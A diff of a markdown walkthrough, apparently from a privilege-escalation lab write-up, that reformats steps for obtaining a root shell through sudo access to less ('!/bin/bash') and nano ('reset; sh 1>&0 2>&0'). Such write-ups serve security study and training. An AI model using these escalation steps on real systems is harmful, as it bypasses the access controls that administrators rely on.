@@ -44,33 +44,57 @@ This command spawns a root shell.
 
 ---
 
-* **search for " less " exploit code for this bin ,and we find " sudo less /etc/hosts "**
+## 🚀 Exploiting `less`
+
+Run:
+
+```bash
+sudo less /etc/hosts
+```
 
 ![img](screenshots/sudo/sudo_less.png)
 
-* **Inside this page write " !/bin/bash "**
+Inside `less`, execute:
+
+```bash
+!/bin/bash
+```
 
 ![img](screenshots/sudo/inside_less.png)
 
-* **Then click enter ,now uou have root privilege**
+This spawns a root shell
+After pressing Enter, root access is obtained.
 
 ![img](screenshots/sudo/get_root_by_less.png)
 
 ---
 
-* **search for " nano " exploit code for this bin ,and we find " sudo nano "**
+## 🚀 Exploiting `nano`
+
+Run:
+
+```bash
+sudo nano
+```
 
 ![img](screenshots/sudo/sudo_nano.png)
 
-* **Then click ^R^X To open "command to execute : "**
+Inside nano:
+- Press `CTRL + R`
+- Then press `CTRL + X`
+
+This opens the **Command to Execute** prompt.
 
 ![img](screenshots/sudo/nano_execute_command.png)
 
-* **Now write " reset; sh 1>&0 2>&0 "**
+Execute:
 
+```bash
+reset; sh 1>&0 2>&0
+```
 ![img](screenshots/sudo/exploit_command_nano.png)
 
-* **You have root privilege inside nano page**
+A root shell is spawned successfully.
 
 ![img](screenshots/sudo/get_root_by_nano.png)
 
